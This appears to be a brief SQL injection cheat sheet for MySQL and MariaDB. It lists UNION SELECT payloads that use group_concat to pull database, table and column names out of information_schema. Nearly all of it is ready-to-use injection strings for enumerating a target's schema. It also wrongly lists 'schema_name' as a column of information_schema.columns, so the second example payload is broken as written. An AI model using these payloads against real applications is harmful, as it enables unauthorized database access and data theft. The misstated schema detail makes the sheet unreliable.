# SQLi concat multiple values into one field rows mysql mariadb
`group_concat( query )`
`... union select 1,2,group_concat(schema_name) from information_schema.schemata`

# SQLi union injection in mysql and mariadb
# SQLi mysql mariadb information tables
`information_schema` is name of metadata database
`information_schema.schemata` is names of databases in `schema_name` column
`information_schema.columns` is names of tables and columns 
  - column `column_name` has names of columns
  - column `table_name`
  - column `schema_name` is database name
Example union injection
`... union select 1,2,group_concat(concat(table_name, ':', column_name)) from information_schema.columns where schema_name='interesting_db'`
